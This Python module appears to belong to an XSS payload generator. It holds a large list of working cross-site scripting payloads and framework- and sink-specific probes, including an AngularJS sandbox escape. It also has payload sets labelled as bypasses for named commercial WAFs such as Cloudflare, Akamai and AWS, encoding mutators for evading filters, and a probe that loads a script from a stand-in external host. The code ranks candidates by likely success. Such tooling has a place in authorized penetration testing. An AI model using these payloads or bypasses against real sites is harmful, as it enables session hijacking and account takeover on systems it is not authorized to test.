from __future__ import annotations

import html
from itertools import cycle
import re
from dataclasses import replace
from urllib.parse import quote

import requests

from ai_xss_generator.types import ParsedContext, PayloadCandidate, PayloadGenerationOptions


BASE_PAYLOADS: list[PayloadCandidate] = [
    PayloadCandidate(
        payload="\"><svg/onload=alert(document.domain)>",
        title="SVG onload break-out",
        explanation="Breaks out of an HTML attribute and pivots to an auto-firing SVG handler.",
        test_vector="Inject into reflected attribute or query parameter rendered into HTML.",
        tags=["polyglot", "attribute-breakout", "auto-trigger"],
    ),
    PayloadCandidate(
        payload="<img src=x onerror=alert(1)>",
        title="Classic image error",
        explanation="Useful against raw HTML insertion via innerHTML or template rendering.",
        test_vector="Send through fields reflected into DOM sink or server-side template.",
        tags=["dom", "html", "onerror"],
    ),
    PayloadCandidate(
        payload="<svg><script>alert(1)</script>",
        title="SVG script block",
        explanation="Works against sinks that preserve SVG or XML-ish fragments.",
        test_vector="Try in rich text or unsafely sanitized SVG upload/preview flows.",
        tags=["svg", "script-tag", "polyglot"],
    ),
    PayloadCandidate(
        payload="javascript:alert(document.cookie)",
        title="Protocol handler URI",
        explanation="Targets href/src assignments or framework bindings writing dangerous URLs.",
        test_vector="Inject into link inputs, router params, or href property sinks.",
        tags=["uri", "protocol", "href"],
    ),
    PayloadCandidate(
        payload="';alert(String.fromCharCode(88,83,83))//",
        title="Single-quote JS break-out",
        explanation="Escapes string literals that land in eval, setTimeout, or inline handlers.",
        test_vector="Use in query fragments or form inputs copied into JS strings.",
        tags=["js-context", "quote-breakout", "eval"],
    ),
    PayloadCandidate(
        payload="</script><script>alert(1)</script>",
        title="Script tag close-and-reopen",
        explanation="Closes an existing script context and starts a fresh executable block.",
        test_vector="Try where user content is embedded directly in a script tag.",
        tags=["script-context", "close-tag", "dom"],
    ),
    PayloadCandidate(
        payload="&#x3c;img src=x onerror=alert(1)&#x3e;",
        title="HTML-encoded image error",
        explanation="Bypasses weak filters that decode entities before inserting into HTML.",
        test_vector="Useful when input is entity-encoded once before rendering.",
        tags=["encoding", "html-entity", "evasion"],
    ),
    PayloadCandidate(
        payload="<details open ontoggle=alert(1)>",
        title="Details toggle auto-fire",
        explanation="Triggers without click in some rendering paths once the element is opened.",
        test_vector="Use where tag allowlists keep uncommon interactive elements.",
        tags=["html", "event", "evasion"],
    ),
    PayloadCandidate(
        payload="<math><mtext><img src=x onerror=alert(1)>",
        title="MathML wrapper",
        explanation="Targets sanitizers that overlook MathML namespaced content.",
        test_vector="Test on rich HTML sinks with partial allowlists.",
        tags=["mathml", "polyglot", "evasion"],
    ),
    PayloadCandidate(
        payload="Set.constructor`alert\\x281\\x29`()",
        title="Template literal constructor gadget",
        explanation="A no-parentheses variant for JS execution in template-literal-friendly sinks.",
        test_vector="Try in script expressions or framework expression injections.",
        tags=["constructor", "template-literal", "evasion"],
    ),
    PayloadCandidate(
        payload="jaVasCript:alert(1)",
        title="Case-variant javascript URI",
        explanation="Bypasses naive lowercase-only deny checks on protocol handlers.",
        test_vector="Inject into href or router-link style bindings.",
        tags=["uri", "case-variant", "evasion"],
    ),
    PayloadCandidate(
        payload="\\u003cimg src=x onerror=alert(1)\\u003e",
        title="Unicode escaped HTML",
        explanation="Useful when a JS string is later decoded and assigned into innerHTML.",
        test_vector="Send into JSON/JS contexts that later hydrate DOM.",
        tags=["unicode", "js-string", "dom"],
    ),
    PayloadCandidate(
        payload="[]['filter']['constructor']('alert(1)')()",
        title="Constructor chain gadget",
        explanation="Useful when `eval` is filtered but Function constructor gadgets are reachable.",
        test_vector="Target client-side JS expressions or template engines.",
        tags=["constructor", "jsfuck-ish", "eval-bypass"],
    ),
    PayloadCandidate(
        payload="<iframe srcdoc='<script>alert(1)</script>'>",
        title="srcdoc iframe",
        explanation="Triggers where arbitrary HTML is allowed but direct script tags are filtered.",
        test_vector="Try in innerHTML sinks with relaxed tag stripping.",
        tags=["iframe", "srcdoc", "html"],
    ),
    PayloadCandidate(
        payload="--><img src=x onerror=alert(1)>",
        title="Comment break-out",
        explanation="Useful when attacker input lands inside an HTML comment before rendering.",
        test_vector="Try against debug comments and hidden template fragments.",
        tags=["comment-breakout", "html", "onerror"],
    ),
    PayloadCandidate(
        payload="<a autofocus onfocus=alert(1) tabindex=1>x</a>",
        title="Autofocus anchor",
        explanation="Useful when interaction is limited but autofocus is preserved.",
        test_vector="Inject into HTML fragments inserted on page load.",
        tags=["autofocus", "focus", "event"],
    ),
    PayloadCandidate(
        payload="${alert(1)}",
        title="Template expression probe",
        explanation="Targets client-side template injections in Vue, AngularJS, and similar stacks.",
        test_vector="Inject into interpolation slots or template-bound attributes.",
        tags=["template-injection", "framework", "expression"],
    ),
    PayloadCandidate(
        payload="';top['al'+'ert'](1);//",
        title="Concatenated alert call",
        explanation="Avoids exact keyword matching inside JS string break-outs.",
        test_vector="Try where alert/eval are blocked by simplistic regex filters.",
        tags=["js-context", "concat", "evasion"],
    ),
    PayloadCandidate(
        payload="</title><svg/onload=alert(1)>",
        title="Title tag escape",
        explanation="Useful when user input lands inside title or metadata tags.",
        test_vector="Inject into search pages or dynamic titles.",
        tags=["metadata", "svg", "close-tag"],
    ),
    PayloadCandidate(
        payload="<form><button formaction=javascript:alert(1)>go</button></form>",
        title="Form action protocol gadget",
        explanation="Targets environments that validate anchors but not form actions.",
        test_vector="Try in form builders or HTML editors.",
        tags=["form", "protocol", "html"],
    ),
    PayloadCandidate(
        payload="x' onmouseover='alert(1)' x='",
        title="Inline handler splice",
        explanation="Breaks into existing attributes and inserts a new event handler.",
        test_vector="Inject into quoted attribute values and hover-enabled widgets.",
        tags=["attribute-breakout", "event-handler", "quoted"],
    ),
    PayloadCandidate(
        payload="';document.body.innerHTML='<img src=x onerror=alert(1)>'//",
        title="Script-to-DOM chain",
        explanation="Turns a JS string breakout into a secondary innerHTML sink for persistence.",
        test_vector="Best against data copied into setTimeout/eval or inline script blocks.",
        tags=["chain", "innerHTML", "js-context"],
    ),
    PayloadCandidate(
        payload='"><script src=//example.invalid/xss.js></script>',
        title="External script include probe",
        explanation="Useful for controlled callbacks during manual testing if CSP is weak.",
        test_vector="Only use against authorized targets with controlled listener infra.",
        tags=["external-script", "callback", "probe"],
    ),
    PayloadCandidate(
        payload="<object data='data:text/html,<script>alert(1)</script>'></object>",
        title="Data URI object embed",
        explanation="Can survive filters that only inspect outer tags.",
        test_vector="Try in HTML preview widgets that allow embedded objects.",
        tags=["data-uri", "object", "html"],
    ),
]

PUBLIC_PAYLOAD_FEEDS = (
    "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
)

BUNDLED_PUBLIC_PAYLOADS = (
    '"><svg/onload=confirm?.(1)>',
    "<img src=x onerror=confirm?.(1)>",
    "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)>x</a></svg>",
    "<body onpageshow=alert(1)>",
    "<iframe srcdoc='<img src=x onerror=alert(1)>'>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<video><source onerror=alert(1)>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<math href='javascript:alert(1)'>CLICKME</math>",
)

WAF_BYPASS_PAYLOADS: dict[str, list[str]] = {
    "akamai": [
        "%3Csvg%2Fonload%3Dalert%281%29%3E",
        "&#x3C;img src=x onerror=alert(1)&#x3E;",
        "jaVasCript:alert(1)",
    ],
    "cloudflare": [
        "<svg/onload=alert?.(1)>",
        "%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
        "<iframe srcdoc='<svg onload=alert(1)>'>",
    ],
    "imperva": [
        "<details open ontoggle=alert(1)>",
        "<math><mtext><img src=x onerror=alert(1)>",
        "\\u003cimg src=x onerror=alert(1)\\u003e",
    ],
    "modsecurity": [
        "<svg%0Aonload=alert(1)>",
        "x' onmouseover='alert(1)' x='",
        "[]['filter']['constructor']('alert(1)')()",
    ],
    "aws": [
        "%253Csvg%252Fonload%253Dalert%25281%2529%253E",
        "<object data='data:text/html,<script>alert(1)</script>'></object>",
        "&#x3c;svg/onload=alert(1)&#x3e;",
    ],
    "awswaf": [
        "%253Csvg%252Fonload%253Dalert%25281%2529%253E",
        "<object data='data:text/html,<script>alert(1)</script>'></object>",
        "&#x3c;svg/onload=alert(1)&#x3e;",
    ],
}

WAF_STRATEGY_NOTES = {
    "akamai": "Favor case shifts and single-pass decoding probes.",
    "cloudflare": "Favor percent-encoding and nested HTML document probes.",
    "imperva": "Favor uncommon HTML namespaces and escaped markup variants.",
    "modsecurity": "Favor newline-separated tag syntax and JS constructor gadgets.",
    "aws": "Favor double-decoding probes and alternate container elements.",
    "awswaf": "Favor double-decoding probes and alternate container elements.",
}


def _mixed_case_keywords(value: str) -> str:
    def replace_keyword(match: re.Match[str]) -> str:
        pattern = cycle((str.upper, str.lower))
        return "".join(next(pattern)(char) for char in match.group(0))

    return re.sub(r"script|javascript|alert|onerror|onload", replace_keyword, value, flags=re.IGNORECASE)


def _html_entity_variant(value: str) -> str:
    return "".join(
        {
            "<": "&#x3c;",
            ">": "&#x3e;",
            '"': "&quot;",
            "'": "&#x27;",
        }.get(char, char)
        for char in value
    )


def _js_unicode_variant(value: str) -> str:
    return "".join(
        {
            "<": "\\u003c",
            ">": "\\u003e",
            '"': "\\u0022",
            "'": "\\u0027",
            "/": "\\u002f",
        }.get(char, char)
        for char in value
    )


def _public_payload_candidate(payload: str, *, source: str) -> PayloadCandidate:
    return PayloadCandidate(
        payload=payload,
        title="Public payload corpus",
        explanation="Loaded from a public XSS payload corpus or the bundled offline fallback set.",
        test_vector="Replay against the highest-confidence reflected or DOM sink.",
        tags=["public", "corpus", "evasion"],
        source=source,
    )


def _fetch_remote_public_payloads() -> list[PayloadCandidate]:
    for feed in PUBLIC_PAYLOAD_FEEDS:
        try:
            response = requests.get(feed, timeout=1.5, headers={"User-Agent": "axss/0.1"})
            response.raise_for_status()
        except Exception:
            continue

        payloads: list[PayloadCandidate] = []
        seen: set[str] = set()
        for line in response.text.splitlines():
            payload = line.strip()
            if not payload or payload.startswith("#") or len(payload) > 300:
                continue
            if payload in seen:
                continue
            seen.add(payload)
            payloads.append(_public_payload_candidate(payload, source="public-remote"))
            if len(payloads) >= 24:
                return payloads
    return []


def fetch_public_payloads() -> list[PayloadCandidate]:
    remote = _fetch_remote_public_payloads()
    if remote:
        return remote
    return [_public_payload_candidate(payload, source="public-bundled") for payload in BUNDLED_PUBLIC_PAYLOADS]


def mutate_bypass_payload(payload: str, waf: str = "") -> list[PayloadCandidate]:
    raw_payload = payload.strip()
    if not raw_payload:
        return []

    waf_key = waf.strip().lower().replace("-", "")
    variants: list[tuple[str, str, str, list[str]]] = [
        (
            raw_payload,
            "Supplied bypass seed",
            "Uses the caller-provided payload string as the seed candidate.",
            ["bypass", "seed"],
        ),
        (
            _mixed_case_keywords(raw_payload),
            "Keyword case mutation",
            "Shifts keyword casing to probe naive deny-lists and signature matching.",
            ["bypass", "case-variant"],
        ),
        (
            _html_entity_variant(raw_payload),
            "HTML entity mutation",
            "Encodes markup metacharacters for decode-before-render paths.",
            ["bypass", "html-entity"],
        ),
        (
            quote(raw_payload, safe=""),
            "Percent-encoded mutation",
            "Encodes the full payload for URL or redirect sinks that decode before rendering.",
            ["bypass", "percent-encoding"],
        ),
        (
            quote(quote(raw_payload, safe=""), safe=""),
            "Double-encoded mutation",
            "Targets multi-stage decoding and some edge WAF normalization paths.",
            ["bypass", "double-encoding"],
        ),
        (
            _js_unicode_variant(raw_payload),
            "JS unicode mutation",
            "Useful when attacker input lands in a JavaScript string before DOM insertion.",
            ["bypass", "unicode-escape"],
        ),
    ]

    if waf_key in WAF_STRATEGY_NOTES:
        variants.append(
            (
                html.escape(raw_payload, quote=True),
                f"{waf.strip() or waf_key} HTML-escaped variant",
                WAF_STRATEGY_NOTES[waf_key],
                ["bypass", "waf", waf_key],
            )
        )

    candidates: list[PayloadCandidate] = []
    seen: set[str] = set()
    for candidate, title, explanation, tags in variants:
        if not candidate or candidate in seen:
            continue
        seen.add(candidate)
        candidates.append(
            PayloadCandidate(
                payload=candidate,
                title=title,
                explanation=explanation,
                test_vector="Inject the mutated candidate into the same sink as the original payload and compare normalization.",
                tags=tags,
                source="bypass",
            )
        )
    return candidates


def waf_payloads(waf: str, bypass_seed: str = "") -> list[PayloadCandidate]:
    waf_label = waf.strip()
    waf_key = waf_label.lower().replace("-", "")
    if not waf_key:
        return []

    candidates: list[PayloadCandidate] = []
    seen: set[str] = set()
    for payload in WAF_BYPASS_PAYLOADS.get(waf_key, []):
        if payload in seen:
            continue
        seen.add(payload)
        candidates.append(
            PayloadCandidate(
                payload=payload,
                title=f"{waf_label or waf_key} bypass probe",
                explanation=WAF_STRATEGY_NOTES.get(waf_key, "WAF-oriented encoding and parser differential probe."),
                test_vector=f"Replay against the suspected {waf_label or waf_key} edge and compare response normalization.",
                tags=["waf", waf_key, "evasion"],
                source="waf",
            )
        )

    if bypass_seed:
        for candidate in mutate_bypass_payload(bypass_seed, waf=waf_key):
            payload = candidate.payload
            if payload in seen:
                continue
            seen.add(payload)
            candidates.append(
                replace(
                    candidate,
                    title=f"{waf_label or waf_key} {candidate.title}",
                    explanation=WAF_STRATEGY_NOTES.get(waf_key, candidate.explanation),
                    tags=list(dict.fromkeys([*candidate.tags, "waf", waf_key])),
                    source="waf",
                )
            )
    return candidates


def _framework_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    frameworks = {framework.lower() for framework in context.frameworks}
    if "react" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload='{"__html":"<img src=x onerror=alert(1)>"}',
                title="React dangerouslySetInnerHTML probe",
                explanation="Targets components that pass attacker-controlled content into `dangerouslySetInnerHTML`.",
                test_vector="Inject into props or JSON blobs feeding rich preview components.",
                tags=["react", "dangerouslySetInnerHTML", "dom"],
                framework_hint="React",
                target_sink="dangerouslySetInnerHTML",
            )
        )
    if "vue" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload='{{constructor.constructor("alert(1)")()}}',
                title="Vue expression gadget",
                explanation="Probes template-expression injection in older Vue or unsafe compiler flows.",
                test_vector="Inject into user-controlled template fragments or runtime-compiled components.",
                tags=["vue", "expression", "constructor"],
                framework_hint="Vue",
            )
        )
    if "angular" in frameworks or "angularjs" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload="{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
                title="AngularJS sandbox escape probe",
                explanation="Targets legacy AngularJS expression contexts with weak sandboxing.",
                test_vector="Use only if interpolation lands inside AngularJS templates.",
                tags=["angularjs", "sandbox-escape", "expression"],
                framework_hint="AngularJS",
            )
        )
    return payloads


def _sink_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    sink_names = {sink.sink.lower() for sink in context.dom_sinks}
    if "innerhtml" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                title="innerHTML SVG animate",
                explanation="Useful where innerHTML accepts SVG but strips plain script blocks.",
                test_vector="Inject into DOM content assignments or HTML preview widgets.",
                tags=["innerHTML", "svg", "animate"],
                target_sink="innerHTML",
            )
        )
    if "eval" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="');Function('alert(1)')();//",
                title="Eval-to-Function chain",
                explanation="Escapes a string passed to eval and falls into a secondary execution primitive.",
                test_vector="Use in query or hash data copied into eval-based routers.",
                tags=["eval", "function-constructor", "js-context"],
                target_sink="eval",
            )
        )
    if "settimeout" in sink_names or "setinterval" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="alert?.(1)//",
                title="Timer string execution probe",
                explanation="Small payload for timer callbacks passed as strings.",
                test_vector="Try where input is concatenated into setTimeout or setInterval.",
                tags=["timer", "js-context", "short"],
                target_sink="setTimeout",
            )
        )
    return payloads


def _input_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    for input_field in context.inputs[:6]:
        descriptor = input_field.name or input_field.id_value or input_field.tag
        payloads.append(
            PayloadCandidate(
                payload=f"seed:{descriptor}:<svg/onload=alert(1)>",
                title=f"Field-specific probe for {descriptor}",
                explanation="Tracks reflection path per field while still carrying an executable payload.",
                test_vector=f"Submit through `{descriptor}` and observe reflected path or DOM mutation.",
                tags=["field-specific", "tracing", input_field.input_type or "input"],
            )
        )
    return payloads


def base_payloads_for_context(context: ParsedContext) -> list[PayloadCandidate]:
    payloads = list(BASE_PAYLOADS)
    payloads.extend(_framework_payloads(context))
    payloads.extend(_sink_payloads(context))
    payloads.extend(_input_payloads(context))
    return payloads


def payloads_for_options(
    context: ParsedContext,
    options: PayloadGenerationOptions,
) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    if options.public:
        payloads.extend(fetch_public_payloads())
    if options.bypass:
        payloads.extend(mutate_bypass_payload(options.bypass, waf=options.waf))
    if options.waf:
        payloads.extend(waf_payloads(options.waf, bypass_seed=options.bypass))
        context.notes.append(f"WAF bypass mode enabled for {options.waf}.")
    if options.public:
        context.notes.append("Public payload corpus enabled.")
    if options.bypass:
        context.notes.append("Bypass mutation mode enabled.")
    context.notes = list(dict.fromkeys(context.notes))
    return payloads


def score_payload(payload: PayloadCandidate, context: ParsedContext) -> int:
    score = 25
    text = payload.payload.lower()
    sink_names = {sink.sink.lower() for sink in context.dom_sinks}
    frameworks = {framework.lower() for framework in context.frameworks}
    handlers = {handler.lower() for handler in context.event_handlers}

    if any(keyword in text for keyword in ("innerhtml", "<img", "<svg", "<iframe", "<math", "<object")):
        score += 15
    if any(sink in payload.tags or sink == payload.target_sink.lower() for sink in sink_names):
        score += 20
    if "eval" in sink_names and any(keyword in text for keyword in ("function(", "constructor", "alert?.(", "set.constructor")):
        score += 18
    if "react" in frameworks and "react" in (payload.framework_hint or "").lower():
        score += 18
    if "vue" in frameworks and "vue" in (payload.framework_hint or "").lower():
        score += 18
    if ("angular" in frameworks or "angularjs" in frameworks) and "angular" in (payload.framework_hint or "").lower():
        score += 18
    if any(tag in payload.tags for tag in ("polyglot", "chain", "evasion")):
        score += 10
    if any(handler.replace("on", "") in text for handler in handlers):
        score += 8
    if context.forms:
        score += min(10, len(context.forms) * 2)
    if "javascript:" in text:
        score += 8
    if "seed:" in text:
        score -= 5
    return max(1, min(score, 100))


def dedupe_payloads(payloads: list[PayloadCandidate]) -> list[PayloadCandidate]:
    unique: dict[str, PayloadCandidate] = {}
    for payload in payloads:
        existing = unique.get(payload.payload)
        if existing is None or payload.risk_score > existing.risk_score:
            unique[payload.payload] = payload
    return list(unique.values())


def rank_payloads(payloads: list[PayloadCandidate], context: ParsedContext) -> list[PayloadCandidate]:
    scored: list[PayloadCandidate] = []
    for payload in dedupe_payloads(payloads):
        scored.append(replace(payload, risk_score=score_payload(payload, context)))
    return sorted(scored, key=lambda item: (-item.risk_score, item.payload))
